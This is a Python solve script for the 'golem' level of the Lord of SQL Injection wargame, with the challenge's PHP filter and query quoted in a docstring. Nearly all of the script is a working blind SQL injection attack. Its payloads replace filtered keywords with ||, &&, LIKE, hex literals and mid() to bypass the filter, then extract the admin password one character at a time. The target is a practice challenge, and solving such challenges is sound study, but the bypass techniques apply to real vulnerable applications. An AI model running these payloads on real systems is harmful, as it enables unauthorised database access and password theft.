#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Golem

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem");
    """

    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'||length(pw)>%s&&id like 0x61646d696e#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"'||id like 'admin'&&ascii(mid(pw,%d,1))<%s#"
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    response = p.my_request()

    if 'Clear!' in response:
        print('\nGOLEM Clear!')


if __name__ == '__main__':
    main()
